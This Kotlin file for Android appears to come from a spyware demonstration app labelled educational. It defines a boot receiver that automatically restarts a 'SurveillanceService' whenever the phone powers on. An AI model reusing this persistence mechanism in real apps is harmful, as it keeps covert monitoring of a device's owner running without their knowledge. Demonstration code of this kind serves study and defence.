package com.example.ChatterBox.malicious

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

/**
 * Receiver that starts the surveillance service when the device boots.
 * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
 */
class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            Log.d("MaliciousDemo", "Device booted, starting surveillance service")
            
            val serviceIntent = Intent(context, SurveillanceService::class.java)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        }
    }
}
